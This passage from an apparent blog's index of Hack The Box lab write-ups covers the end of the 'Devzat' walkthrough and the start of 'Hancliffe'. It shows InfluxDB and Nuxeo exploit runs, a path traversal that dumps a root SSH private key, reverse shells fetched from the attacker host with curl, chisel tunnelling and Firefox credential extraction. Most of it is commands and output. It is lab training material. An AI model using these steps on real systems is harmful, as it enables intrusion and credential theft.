http://172.17.0.2:8086/api/v2 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/users 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/query Method Not Allowed patrick@devzat:~$ curl -XPOST http://172.17.0.2:8086/api/v2/query Flux query service disabled. Verify flux-enabled=true in the [http] section of the InfluxDB config. patrick@devzat:~$ curl -XPOST http://172.17.0.2:8086/api/v2/write 404 page not found  Doing some research on InfluxDB vulnerabilities, we discover an exploit for CVE-2019-20933. This is a Python script that does a bruteforce attack on the username and then handles a connection to the InfluxDB database.\nAfter transfering the exploit to the machine (and removing some dependencies that are not actually needed) we can enumerate the database. An useful command cheatsheet for InfluxDB can be found here.\npatrick@devzat:/tmp$ curl 10.10.17.44/__main__.py -so x.py patrick@devzat:/tmp$ cat \u0026gt; wordlist patrick admin catherine devzat ^C patrick@devzat:/tmp$ python3 x.py Insert ip host (default localhost): Insert port (default 8086): Insert influxdb user (wordlist path to bruteforce username): ./wordlist Start username bruteforce [x] patrick [v] admin Host vulnerable !!! Databases list: 1) devzat 2) _internal Insert database name (exit to close): devzat [devzat] Insert query (exit to change db): SHOW MEASUREMENTS { \"results\": [ { \"series\": [ { \"columns\": [ \"name\" ], \"name\": \"measurements\", \"values\": [ [ \"user\" ] ] } ], \"statement_id\": 0 } ] } [devzat] Insert query (exit to change db): SHOW FIELD KEYS FROM \"user\" { \"results\": [ { \"series\": [ { \"columns\": [ \"fieldKey\", \"fieldType\" ], \"name\": \"user\", \"values\": [ [ \"enabled\", \"boolean\" ], [ \"password\", \"string\" ], [ \"username\", \"string\" ] ] } ], \"statement_id\": 0 } ] } [devzat] Insert query (exit to change db): SELECT * FROM \"user\" { \"results\": [ { \"series\": [ { \"columns\": [ \"time\", \"enabled\", \"password\", \"username\" ], \"name\": \"user\", \"values\": [ [ \"2021-06-22T20:04:16.313965493Z\", false, \"WillyWonka2021\", \"wilhelm\" ], [ \"2021-06-22T20:04:16.320782034Z\", true, \"woBeeYareedahc7Oogeephies7Aiseci\", \"catherine\" ], [ \"2021-06-22T20:04:16.996682002Z\", true, \"RoyalQueenBee$\", \"charles\" ] ] } ], \"statement_id\": 0 } ] }  And we have got some passwords. Now, we can try to login with credentials catherine:woBeeYareedahc7Oogeephies7Aiseci.\nProvided the password, we can read the user.txt flag:\npatrick@devzat:/tmp$ su catherine Password: catherine@devzat:/tmp$ cd catherine@devzat:~$ cat user.txt 67a4643d026d2adced0fd951ea2eb5a9  Now that we are catherine, let\u0026rsquo;s see if we have sudo permissions:\ncatherine@devzat:~$ sudo -l [sudo] password for catherine: Sorry, user catherine may not run sudo on devzat.  Privilege escalation We recall the ZIP files owned by catherine that contained two versions of the SSH chat:\ncatherine@devzat:~$ cd /var/backups/ catherine@devzat:/var/backups$ ll total 1128 drwxr-xr-x 2 root root 4096 Mar 9 06:25 ./ drwxr-xr-x 14 root root 4096 Jun 22 2021 ../ -rw-r--r-- 1 root root 51200 Mar 9 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 59142 Sep 28 18:45 apt.extended_states.0 -rw-r--r-- 1 root root 6588 Sep 21 20:17 apt.extended_states.1.gz -rw-r--r-- 1 root root 6602 Jul 16 2021 apt.extended_states.2.gz -rw------- 1 catherine catherine 28297 Jul 16 2021 devzat-dev.zip -rw------- 1 catherine catherine 27567 Jul 16 2021 devzat-main.zip -rw-r--r-- 1 root root 268 Sep 29 11:46 dpkg.diversions.0 -rw-r--r-- 1 root root 170 Jul 16 2021 dpkg.statoverride.0 -rw-r--r-- 1 root root 949034 Jan 26 14:52 dpkg.status.0 catherine@devzat:/var/backups$ python3 -m http.server 7000 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...  We can transfer the ZIP files to our machine opening a web server with Python on port 7000:\n$ wget -q devzat.htb:7000/devzat-{main,dev}.zip  catherine@devzat:/var/backups$ python3 -m http.server 7000 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ... 10.10.17.44 - - [] \"GET /devzat-main.zip HTTP/1.1\" 200 - 10.10.17.44 - - [] \"GET /devzat-dev.zip HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  And then decompress them:\n$ unzip devzat-dev.zip Archive: devzat-dev.zip creating: dev/ inflating: dev/go.mod extracting: dev/.gitignore inflating: dev/util.go inflating: dev/testfile.txt inflating: dev/eastereggs.go inflating: dev/README.md inflating: dev/games.go inflating: dev/colors.go extracting: dev/log.txt inflating: dev/commands.go inflating: dev/start.sh inflating: dev/devchat.go inflating: dev/LICENSE inflating: dev/commandhandler.go inflating: dev/art.txt inflating: dev/go.sum extracting: dev/allusers.json $ unzip devzat-main.zip Archive: devzat-main.zip creating: main/ inflating: main/go.mod extracting: main/.gitignore inflating: main/util.go inflating: main/eastereggs.go inflating: main/README.md inflating: main/games.go inflating: main/colors.go extracting: main/log.txt inflating: main/commands.go inflating: main/start.sh inflating: main/devchat.go inflating: main/LICENSE inflating: main/commandhandler.go inflating: main/art.txt inflating: main/go.sum inflating: main/allusers.json  Analyzing new features of the chat Now that we have the two folders, we can use diff to view the changes along files:\n$ diff main dev  diff main/allusers.json dev/allusers.json 1,3c1 \u0026lt; { \u0026lt; \"eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3\": \"\\u001b[38;5;214mtest\\u001b[39m\" \u0026lt; } --- \u0026gt; {} diff main/commands.go dev/commands.go 3a4 \u0026gt; \"bufio\" 4a6,7 \u0026gt; \"os\" \u0026gt; \"path/filepath\" 36a40 \u0026gt; file = commandInfo{\"file\", \"Paste a files content directly to chat [alpha]\", fileCommand, 1, false, nil} 38c42,101 \u0026lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} --- \u0026gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} \u0026gt; } \u0026gt; \u0026gt; func fileCommand(u *user, args []string) { \u0026gt; if len(args) \u0026lt; 1 { \u0026gt; u.system(\"Please provide file to print and the password\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; if len(args) \u0026lt; 2 { \u0026gt; u.system(\"You need to provide the correct password to use this function\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; path := args[0] \u0026gt; pass := args[1] \u0026gt; \u0026gt; // Check my secure password \u0026gt; if pass != \"CeilingCatStillAThingIn2021?\" { \u0026gt; u.system(\"You did provide the wrong password\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; // Get CWD \u0026gt; cwd, err := os.Getwd() \u0026gt; if err != nil { \u0026gt; u.system(err.Error()) \u0026gt; } \u0026gt; \u0026gt; // Construct path to print \u0026gt; printPath := filepath.Join(cwd, path) \u0026gt; \u0026gt; // Check if file exists \u0026gt; if _, err := os.Stat(printPath); err == nil { \u0026gt; // exists, print \u0026gt; file, err := os.Open(printPath) \u0026gt; if err != nil { \u0026gt; u.system(fmt.Sprintf(\"Something went wrong opening the file: %+v\", err.Error())) \u0026gt; return \u0026gt; } \u0026gt; defer file.Close() \u0026gt; \u0026gt; scanner := bufio.NewScanner(file) \u0026gt; for scanner.Scan() { \u0026gt; u.system(scanner.Text()) \u0026gt; } \u0026gt; \u0026gt; if err := scanner.Err(); err != nil { \u0026gt; u.system(fmt.Sprintf(\"Something went wrong printing the file: %+v\", err.Error())) \u0026gt; } \u0026gt; \u0026gt; return \u0026gt; \u0026gt; } else if os.IsNotExist(err) { \u0026gt; // does not exist, print error \u0026gt; u.system(fmt.Sprintf(\"The requested file @ %+v does not exist!\", printPath)) \u0026gt; return \u0026gt; } \u0026gt; // bokred? \u0026gt; u.system(\"Something went badly wrong.\") diff main/devchat.go dev/devchat.go 27c27 \u0026lt; port = 8000 --- \u0026gt; port = 8443 114c114 \u0026lt; fmt.Sprintf(\":%d\", port), --- \u0026gt; fmt.Sprintf(\"127.0.0.1:%d\", port), Only in dev: testfile.txt  It seems that the new feature allows to print the contents of a given file from the current working directory. To execute the command, we need to provide CeilingCatStillAThingIn2021? as a password.\nThe other noticeable difference is that the development chat is running on port 8443 internally.\nObtaining the private SSH key for root First, we can try to load the previously created file /tmp/wordlist:\ncatherine@devzat:/var/backups$ ssh -l asdf 127.0.0.1 -p 8443 Welcome to the chat. There are no more users devbot: asdf has joined the chat asdf: /file [SYSTEM] Please provide file to print and the password asdf: /file /tmp/wordlist CeilingCatStillAThingIn2021? [SYSTEM] The requested file @ /root/devzat/tmp/wordlist does not exist!  We see that /tmp/wordlist is being concatenated to /root/devzat. This tells us that the chat is being run by root, and thus we have read privileges.\nTo gain access as root we can read the private SSH key performing a Directory Path Traversal (i.e. providing ../.ssh/id_rsa as file to load, so that the requested file is /root/devzat/../.ssh/id_rsa, which equals /root/.ssh/id_rsa):\nasdf: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021? [SYSTEM] -----BEGIN OPENSSH PRIVATE KEY----- [SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW [SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1 [SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA [SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s [SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg== [SYSTEM] -----END OPENSSH PRIVATE KEY-----  We can save this key, and connect as root using SSH (with no password). Finally, we are able to read the root.txt flag:\n$ chmod 600 id_rsa $ ssh -i id_rsa root@devzat.htb root@devzat:~# cat root.txt e165e399c6a2c920a406997193f68a43  ","image":"/images/HTB/Devzat/Devzat.png","permalink":"https://7rocky.github.io/en/htb/devzat/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine contains chat service over SSH and a hidden web subdomain vulnerable to command injection. Then we can access the machine and exploit a vulnerable version of InluxDB to extract the password for another user. This user has permissions to see a development project for the SSH chat that allows to read arbitrary files from the server. Basic web exploitation and Linux enumeration techniques are needed in order to compromise this machine","time":16,"title":"Devzat"},{"contents":"  OS: Windows   Difficulty: Hard   IP Address: 10.10.11.115   Release: 09 / 10 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.115 -p 80,8000,9999 Nmap scan report for 10.10.11.115 Host is up (0.14s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.21.0 |_http-title: Welcome to nginx! |_http-server-header: nginx/1.21.0 8000/tcp open http nginx 1.21.0 |_http-title: HashPass | Open Source Stateless Password Manager |_http-server-header: nginx/1.21.0 9999/tcp open abyss? | fingerprint-strings: | FourOhFourRequest, GetRequest, HTTPOptions: | Welcome Brankas Application. | Username: Password: | NULL: | Welcome Brankas Application. |_ Username: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 35.05 seconds  This machine has ports 80 (HTTP), 8000 (HTTP) and 9999 open.\nWeb enumeration If we go to http://10.10.11.115:8000, we see a website that has a password generator:\nBut nothing interesting for the moment. Going to http://10.10.11.115 will show nginx default page:\nWe can try to fuzz for more routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.115/FUZZ %20 [Status: 200, Size: 612, Words: 79, Lines: 26] maintenance [Status: 302, Size: 0, Words: 1, Lines: 1]  And there is /maintenance, which redirects to /nuxeo/Maintenance/:\n$ curl 10.10.11.115/maintenance -I HTTP/1.1 302 Server: nginx/1.21.0 Date: Content-Length: 0 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Location: /nuxeo/Maintenance/  Adding a trailing slash will show some information:\nAnd even a JSESSIONID cookie is added for /nuxeo:\n$ curl 10.10.11.115/maintenance/ -I HTTP/1.1 200 Server: nginx/1.21.0 Date: Content-Type: text/html;charset=ISO-8859-1 Content-Length: 714 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Set-Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo; Path=/nuxeo; HttpOnly Vary: Accept-Encoding  The website must be developed in Java (because of the JSESSIONID cookie). Since there is an nginx, maybe there are some path traversal vulnerabilities (breaking parser logic, more information here). Let\u0026rsquo;s try:\n$ curl '10.10.11.115/maintenance/..;/' -iH 'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo' HTTP/1.1 302 Server: nginx/1.21.0 Date: Sun, 06 Mar 2022 21:54:29 GMT Content-Type: text/html;charset=ISO-8859-1 Content-Length: 0 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Location: http://10.10.11.115/nuxeo/nxstartup.faces  It is redirecting to /nuxeo/nxstartup.faces. Let\u0026rsquo;s see what\u0026rsquo;s in this route:\n$ curl '10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces' -iH 'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo' HTTP/1.1 401 Server: nginx/1.21.0 Date: Sun, 06 Mar 2022 21:54:43 GMT Content-Type: text/html;charset=UTF-8 Content-Length: 220 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block \u0026lt;script type=\"text/javascript\"\u0026gt; document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/'; window.location = 'http://10.10.11.115/nuxeo/login.jsp'; \u0026lt;/script\u0026gt;  It again redirects. And here we have a login form:\nHere we can see the version, which is Nuxeo FT 10.2. There is a vulnerability that obtains Remote Code Execution (RCE) via Server-Side Template Injection (SSTI) in Java (CVE-2018-16341). We can read how the exploit works and test if it is vulnerable:\n$ curl $(echo 'http://10.10.11.115/maintenance/..;/login.jsp/pwn${7*7}.xhtml' | sed 's/{/%7b/g' | sed 's/}/%7d/g') \u0026lt;span\u0026gt;\u0026lt;span style=\"color:red;font-weight:bold;\"\u0026gt;ERROR: facelet not found at '/login.jsp/pwn49.xhtml'\u0026lt;/span\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;  Notice that we needed to use URL encoding for { and } (%7b and %7d).\nFoothold on the machine Since it shows pwn49.xhtml, we know it is vulnerable. Now we can use the Python exploit to execute commands on the server. We must change the URL and the architecture to make it work:\n$ python3 CVE-2018-16341.py Nuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341 [+] Checking template injection vulnerability = OK command (WIN)\u0026gt; whoami [+] Executing command =\u0026gt; hancliffe\\svc_account  Now we can try to use a reverse shell. For that, first we must verify that the server reaches our attacker machine:\ncommand (WIN)\u0026gt; curl 10.10.17.44 [+] Executing command =\u0026gt; \u0026amp;lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"\u0026amp;gt;  And it does:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.115 - - [] \"GET / HTTP/1.1\" 200 -  To establish the reverse shell connection I will be using ConPtyShell. We must download it and then run it from the machine while listening with nc:\ncommand (WIN)\u0026gt; curl 10.10.17.44/ConPtyShell.exe -o /windows/temp/r.exe [+] Executing command =\u0026gt; command (WIN)\u0026gt; /windows/temp/r.exe 10.10.17.44 4444 50 158 [+] Executing command =\u0026gt;  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:51152. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Nuxeo\u0026gt;  System enumeration There are some users (clara, development and Administrator):\nPS C:\\Nuxeo\u0026gt; dir C:\\Users Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/30/2021 9:54 AM Administrator d----- 11/30/2021 9:54 AM clara d----- 6/26/2021 10:35 PM development d-r--- 6/3/2021 7:00 AM Public d----- 11/30/2021 9:54 AM svc_account PS C:\\Nuxeo\u0026gt; tree C:\\Users Folder PATH listing Volume serial number is 00000077 B0F6:2F1B C:\\USERS ├───Administrator ├───clara ├───development ├───Public │ ├───Documents │ ├───Downloads │ ├───Music │ ├───Pictures │ └───Videos └───svc_account ├───.nxshell ├───3D Objects ├───Contacts ├───Desktop ├───Documents │ └───WindowsPowerShell ├───Downloads ├───Favorites │ └───Links ├───Links ├───Music ├───OneDrive ├───Pictures │ ├───Camera Roll │ └───Saved Pictures ├───Saved Games ├───Searches └───Videos  We can show some network configuration:\nPS C:\\Nuxeo\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : htb IPv6 Address. . . . . . . . . . . : dead:beef::111 IPv6 Address. . . . . . . . . . . : dead:beef::f0d6:7043:d0e5:2d98 Temporary IPv6 Address. . . . . . : dead:beef::ac37:ca27:2783:1789 Link-local IPv6 Address . . . . . : fe80::f0d6:7043:d0e5:2d98%7 IPv4 Address. . . . . . . . . . . : 10.10.11.115 Subnet Mask . . . . . . . . . . . : 255.255.254.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:324%7 10.10.10.2 PS C:\\Nuxeo\u0026gt; netstat -nat | Select-String LISTEN TCP 0.0.0.0:80 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:135 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:445 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5432 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9321 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9510 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9512 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9512 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9999 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING InHost TCP 10.10.11.115:139 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:1080 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8005 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8009 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8080 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:9200 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:9300 0.0.0.0:0 LISTENING InHost TCP [::]:135 [::]:0 LISTENING InHost TCP [::]:445 [::]:0 LISTENING InHost TCP [::]:5432 [::]:0 LISTENING InHost TCP [::]:5985 [::]:0 LISTENING InHost TCP [::]:9512 [::]:0 LISTENING InHost TCP [::]:47001 [::]:0 LISTENING InHost TCP [::]:49664 [::]:0 LISTENING InHost TCP [::]:49665 [::]:0 LISTENING InHost TCP [::]:49666 [::]:0 LISTENING InHost TCP [::]:49667 [::]:0 LISTENING InHost TCP [::]:49668 [::]:0 LISTENING InHost  Also we can see if Windows Defender has some exclusion paths:\nPS C:\\Nuxeo\u0026gt; reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths' HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths C:\\DevApp\\MyFirstApp.exe REG_DWORD 0x0  And it shows a binary, but we are not able to read it yet.\nInside C:\\Program Files (x86) there is a folder called Unified Remote 3:\nPS C:\\Nuxeo\u0026gt; dir 'C:\\Program Files (x86)' Directory: C:\\Program Files (x86) Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 6/3/2021 7:11 AM Common Files d----- 10/3/2021 11:08 PM Internet Explorer d----- 6/3/2021 8:09 PM Microsoft d----- 12/7/2019 6:48 AM Microsoft.NET d----- 6/26/2021 10:15 PM Mozilla Maintenance Service d----- 6/12/2021 2:51 AM MSBuild d----- 6/12/2021 2:51 AM Reference Assemblies d----- 6/12/2021 12:21 AM Unified Remote 3 d----- 4/9/2021 6:48 AM Windows Defender d----- 7/18/2021 12:20 AM Windows Mail d----- 12/7/2019 6:44 AM Windows NT d----- 4/9/2021 6:48 AM Windows Photo Viewer d----- 12/7/2019 1:25 AM WindowsPowerShell  This service runs on port 9512, which is listening as shown before on the network enumeration.\nLateral movement to user clara There is a public exploit for Unified Remote 3 in ExploitDB. To use it, we must forward the port outside using chisel:\n$ ./chisel server --reverse -p 1234 server: Reverse tunnelling enabled server: Fingerprint L32jA7y7l060Ux4y/lkeGtEmYY/JuhFiN+7tqA3v0TU= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:9512=9512: Listening  PS C:\\Nuxeo\u0026gt; curl 10.10.17.44/chisel.exe -o C:\\Windows\\Temp\\c.exe PS C:\\Nuxeo\u0026gt; C:\\Windows\\Temp\\c.exe client 10.10.17.44:1234 R:9512:127.0.0.1:9512 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 77.0068ms)  The exploit basically downloads a binary from the attacker machine into C:\\Windows\\Temp and then executes it. I decided to tweak the exploit to use ConPtyShell.\n$ python2 49587.py 127.0.0.1 10.10.17.44 ConPtyShell.exe [+] Connecting to target... [+] Popping Start Menu [+] Opening CMD [+] *Super Fast Hacker Typing* [+] Downloading Payload [+] Done! Check listener?  And we get access as clara:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:58167. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\clara\u0026gt;  Here we can read the user.txt flag:\nPS C:\\Users\\clara\u0026gt; type Desktop\\user.txt 3aa9dcfca7cac59c24ed2f14a0952ee7  We still cannot read the binary inside C:\\DevApp:\nPS C:\\Users\\clara\u0026gt; dir C:\\DevApp dir : Access to the path 'C:\\DevApp' is denied. At line:1 char:1 + dir C:\\DevApp + ~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\DevApp:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand  If we run winPEAS to enumerate more, we obtain some saved credentials in Firefox:\n════════════════════════════════════╣ Browsers Information ╠════════════════════════════════════ ╔══════════╣ Showing saved credentials for Firefox Url: http://localhost:8000 Username: hancliffe.htb Password: #@H@ncLiff3D3velopm3ntM@st3rK3y*! ================================================================================================= ╔══════════╣ Looking for Firefox DBs ╚ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history Firefox credentials file exists at C:\\Users\\clara\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljftf853.default-release\\key4.db ╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)  winPEAS already extracts the password from the Firefox database, although we could have used FirePwd.\nLateral movement to user development There was another user called development. We could try to connect to the server using evil-winrm (setting up chisel to forward port 5985):\nPS C:\\Nuxeo\u0026gt; C:\\Windows\\Temp\\c.exe client 10.10.17.44:1234 R:5985:127.0.0.1:5985 2022/03/06 17:14:36 client: Connecting to ws://10.10.17.44:1234 2022/03/06 17:14:37 client: Connected (Latency 105.431ms)  We can try the password for user development but it does not work:\n$ evil-winrm -i 127.0.0.1 -u development -p '#@H@ncLiff3D3velopm3ntM@st3rK3y*!' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1  Here we must recall that there is a web service that generates a password given some fields and a master password (it is likely that the user saved the fields in Firefox database for usability).\nIf we use development, hancliffe.htb and #@H@ncLiff3D3velopm3ntM@st3rK3y*! we get AMl.q2DHp?2.C/V0kNFU as password:\nLet\u0026rsquo;s try it now:\n$ evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt;  It works. And now we are able to list folder C:\\DevApp:\n$ evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt; dir C:\\DevApp Directory: C:\\DevApp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/14/2021 5:02 AM 60026 MyFirstApp.exe -a---- 9/14/2021 10:57 AM 636 restart.ps1  We can download the binary to the attacker machine using some features of evil-winrm:\n*Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt; download C:\\DevApp\\MyFirstApp.exe ./MyFirstApp.exe Info: Downloading C:\\DevApp\\MyFirstApp.exe to ./MyFirstApp.exe Info: Download successful!  Reversing the binary We have a 32-bit Windows portable executable file:\n$ file MyFirstApp.exe MyFirstApp.exe: PE32 executable (console) Intel 80386, for MS Windows  We can use strings to see interesting things. For example, we have the command used to compile the binary:\n$ strings MyFirstApp.exe | grep protector GNU C17 8.1.0 -mtune=generic -march=i686 -g -g -g -O2 -O2 -O2 -fno-ident -fbuilding-libgcc -fno-stack-protector  And we can also find some hard-coded usernames, codes and encrypted passwords:\n$ strings MyFirstApp.exe | grep -C 10 Password setsockopt failed with error: %d bind failed with error: %d Waiting Connection listen failed with error: %d Accept failed with error: %d Connection Received thread cretead Welcome Brankas Application. Send failed with error: %d Username: Password: Login Successfully! FullName: Input Your Code: T3D83CbJkl1299 Vickry Alfiansyah Unlocked Wrong Code Recv failed with error: %d Username or Password incorrect alfiansyah YXlYeDtsbD98eDtsWms5SyU= Unknown error _matherr(): %s in %s(%g, %g) (retval=%g) Argument domain error (DOMAIN) Argument singularity (SIGN) Overflow range error (OVERFLOW) The result is too small to be represented (UNDERFLOW) Total loss of significance (TLOSS) Partial loss of significance (PLOSS)  There is also a message \u0026ldquo;Welcome to Brankas Application\u0026rdquo;. This is a message shown by a service exposed on port 9999 (reported by nmap at the beginning). Hence, we have the binary that produces that service.\nThere is a text that seems to be a password encoded in Base64, let\u0026rsquo;s decode it:\n$ echo YXlYeDtsbD98eDtsWms5SyU= | base64 -d ayXx;ll?|x;lZk9K%  Maybe it is a clear text password, we can try it remotely using alfiansyah as username:\n$ nc 10.10.11.115 9999 Welcome Brankas Application. Username: alfiansyah Password: ayXx;ll?|x;lZk9K% Username or Password incorrect  It is incorrect. Then, what we can do is decompile the binary in Ghidra and look at the generated C source code. The main function basically starts a socket server and listens for new connections. Once a connection arrives, it creates a thread and handles the connection:\nint __cdecl _main(int _Argc, char **_Argv, char **_Env) { // Declarations and initializations local_1c = getaddrinfo(0, \"9999\", \u0026amp;local_1dc, \u0026amp;local_1e0); if (local_1c == 0) { local_20 = socket(*(int *) (local_1e0 + 4), *(int *) (local_1e0 + 8), *(int *) (local_1e0 + 12)); if (local_20 == 0xffffffff) { // Error handling } else { tVar3 = _time((time_t *) 0); _srand((uint) tVar3); local_24 = _rand(); local_28 = *(int *) (local_1e0 + 0x18); local_2c = local_24 % 1000 + 9000; uVar1 = htons((u_short) local_2c); *(u_short *) (local_28 + 2) = uVar1; _printf(\"Server Started on Port %d\\r\\n\", local_2c); local_1c = setsockopt(local_20, 0xffff, 4, (char *) \u0026amp;local_1f8, local_18); if (local_1c == -1) { // Error handling } local_1c = bind(local_20, *(sockaddr **) (local_1e0 + 0x18), *(int *) (local_1e0 + 0x10)); if (local_1c == -1) { // Error handling } else 